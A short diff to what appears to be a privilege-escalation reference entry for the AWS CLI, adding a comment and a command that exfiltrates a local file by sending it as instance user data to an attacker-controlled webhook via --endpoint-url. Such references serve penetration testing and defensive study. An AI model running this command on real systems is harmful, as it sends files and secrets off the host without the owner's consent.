@@ -4,6 +4,8 @@ functions:
   - binary: false
     code: |-
       aws ec2 describe-instances --filter file:///path/to/input-file
+      # AWS CLI can be also abused for data exfiltration - useful when --filter is blocked or the output is not displayed. The webhook file will be in a base64 format in the UserData field:
+      aws ec2 run-instances --endpoint-url "https://<YOUR_WEBHOOK>" --image-id "ami-0aa2b7722dc1b5612" --instance-type "t2.micro" --count 1 --subnet-id "subnet-0e8da6d08a1ac4d6e" --security-group-ids "sg-0aea91f043c16ba2e" --key-name "MyKeyPair" --user-data "file:///path/to/input-file" --no-sign-request --region us-east-1
     contexts:
       sudo:
       suid:
